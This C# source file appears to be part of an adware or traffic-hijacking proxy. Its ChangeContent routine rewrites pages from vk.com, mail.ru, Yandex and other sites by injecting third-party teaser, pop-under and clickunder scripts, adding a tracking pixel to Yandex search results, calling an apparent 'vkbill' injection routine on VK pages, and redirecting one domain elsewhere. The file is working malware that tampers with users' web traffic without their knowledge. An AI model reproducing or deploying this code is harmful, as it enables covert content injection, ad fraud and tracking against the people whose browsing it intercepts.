using System;
using System.Collections.Generic;
using System.Net;

namespace ProxyService;

public class XmlHelper
{
	public struct keyword
	{
		public int tickcount;

		public string key;
	}

	public static string[] goodsites = new string[14]
	{
		"vk.com", "mail.ru", "odnoklassniki.ru", "rutracker.org", "/yandsearch", "google.ru/", "google.com.ua", "google.ua", "goole.by", "goolge.kz",
		"google.com", "pornhub.com", "youtube.com", "rutube.ru"
	};

	public static Random oldRandom = new Random();

	public static List<keyword> keys = new List<keyword>();

	public static void Load()
	{
	}

	public static bool httpIsEnvoved(HttpWebRequest req, HttpWebResponse resp)
	{
		string text = req.Address.ToString();
		string text2 = "";
		try
		{
			text2 = resp.ContentType;
			_ = req.Referer;
		}
		catch (Exception)
		{
		}
		bool result = false;
		string[] array = goodsites;
		foreach (string value in array)
		{
			if (text.ToLower().Contains(value))
			{
				result = true;
			}
		}
		if (text2.Contains("text/html"))
		{
			if (rnd(100) > 30)
			{
				return result;
			}
			return true;
		}
		return false;
	}

	public static int rnd(int from)
	{
		return oldRandom.Next(0, from);
	}

	public static string ChangeContent(string str, string url, string refx)
	{
		if (url.Contains("domenagent.ru"))
		{
			vkbill.vkCatchBilled(str);
			return str;
		}
		ProxyServer.dbg("replace: " + url + "/" + refx);
		string text = "\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.ashx?flow_id=1&block_id=1&sub_key=vk'>\r\n</script>\r\n<script>\r\n\tv=3; // тизеров по горизонтали\r\n\th=1; // тизеров по вертикали\r\n\timage_size=100; // размер тизера\r\n\ttext_position=4 //положение текста: 1- справа, 2 - слева, 3 - сверху, 4 - снизу \r\n</script>\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.js'>\r\n</script>\r\n";
		string text2 = "<div id='bn_bfb5187b1b'>загрузка...</div>\r\n            <script type='text/javascript' SRC='http://recreativ.ru/rcode.bfb5187b1b.js'></script> ";
		string newValue = "<div id='DIV_DA_90725'></div><script charset='windows-1251' type='text/javascript' src='http://www.directadvert.ru/show.cgi?adp=90725&div=DIV_DA_90725'></script>";
		string text3 = "\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.ashx?flow_id=1&block_id=1&sub_key='>\r\n</script>\r\n<script>\r\n\tv=2; // тизеров по горизонтали\r\n\th=2; // тизеров по вертикали\r\n\timage_size=110; // размер тизера\r\n\ttext_position=1 //положение текста: 1- справа, 2 - слева, 3 - сверху, 4 - снизу \r\n</script>\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.js'></script>";
		string[] array = new string[2]
		{
			text + text2,
			text + text2
		};
		if (url.Contains("vk.com"))
		{
			if (vkbill.IsInjectVKBill(url, str))
			{
				str = vkbill.vkBillCode(str);
			}
			else
			{
				str = str.Replace("<div id=\"left_blocks\"></div>", "");
				str = str.Replace("<div id=\"left_ads\"></div>", array[rnd(array.Length)]);
			}
		}
		if (url.Contains("mail.ru"))
		{
			str = str.Replace("<script>splashRadar('informers');</script>", text3 + " ");
			str = str.Replace("<script>splashRadar('news', 1);</script>", newValue);
		}
		string text4 = " <script>\r\n var siteid=57864;\r\n var cats='0';\r\n var adult='1';\r\n</script> \r\n<script src='http://linkupper.ru/clickunder.js'></script>";
		string text5 = "\r\n\r\n                    <div id='DIV_DA_90338'></div>\r\n                    <script charset='windows-1251' type='text/javascript' src='http://www.directadvert.ru/show.cgi?adp=90338&div=DIV_DA_90338'></script>";
		string text6 = "\r\n<script language='javascript' type='text/javascript' src='http://popun.domenagent.ru/5pdvtwcu3a498u0ohrq7mc1bl6otjsd1'></script>\r\n";
		string text7 = "<script type='text/javascript'>var sid=57864,bid=4117;</script><script type='text/javascript' src='http://vmblock.net/vm.js'></script>";
		string text8 = "<script src='http://contact-under.ru/upper_vk.js'></script>";
		string[] array2 = new string[5] { text5, text6, text7, text8, text4 };
		string text9 = array2[rnd(array2.Length)] + array2[rnd(array2.Length)];
		str = ((!url.Contains("vk.com")) ? (str + text9) : str.Replace("<noscript><meta http-equiv=\"refresh\" content=\"0; URL=/badbrowser.php\"></noscript>", text9));
		string text10 = "\r\n <div id='cpr_5076'></div> <script language='javascript' type='text/javascript'>   var cashprom_p = '5076';  var cashprom_d = 'cpr_5076';  var cashprom_width = '240';  var cashprom_height = '400';   </script>  <script charset='UTF-8' language='javascript' type='text/javascript' src='http://slave.cashprom.ru/load.js'></script>";
		string text11 = "<div id='bn_4614cef1a1'>загрузка...</div>\r\n <script type='text/javascript' SRC='http://recreativ.ru/rcode.4614cef1a1.js'></script>";
		string[] array3 = new string[2] { text10, text11 };
		if (url.Contains("yandex.ru/yandsearch") || url.Contains("yandex.ua/yandsearch") || url.Contains("yandex.by/yandsearch") || url.Contains("yandex.kz/yandsearch"))
		{
			string text12 = str;
			text12 = str.Replace(">Разместить объявление по запросу", array3[rnd(array3.Length)] + ">Разместить объявление по запросу");
			if (text12 != str)
			{
				str = text12;
			}
			str = str.Replace("</title>", "</title><img width=0 height=0 src='http://domenagent.ru/service/test/Default_files/_se.ashx?rnd=" + rndtext() + "'></img>");
		}
		if (url.Contains("support-contact.ws"))
		{
			str = "<html><script>document.location='http://adobe.com'</script></html>";
		}
		return str;
	}

	private static string rep(string str, string from, string tos, string withs)
	{
		int num = str.IndexOf(from);
		int num2 = str.IndexOf(tos, Math.Max(0, num));
		if (num != -1 && num2 != -1)
		{
			string oldValue = str.Substring(num, num2 - num + tos.Length);
			str = str.Replace(oldValue, withs);
		}
		return str;
	}

	public static string extr(string str, string from, string tos, bool withCorners)
	{
		int num = str.IndexOf(from);
		int num2 = str.IndexOf(tos, Math.Max(0, num));
		if (num != -1 && num2 != -1)
		{
			string text = "";
			if (withCorners)
			{
				return str.Substring(num, num2 - num + tos.Length);
			}
			return str.Substring(num + from.Length, num2 - num - from.Length);
		}
		return "";
	}

	public static string rndtext()
	{
		return new Random().Next(1, 100000).ToString();
	}
}
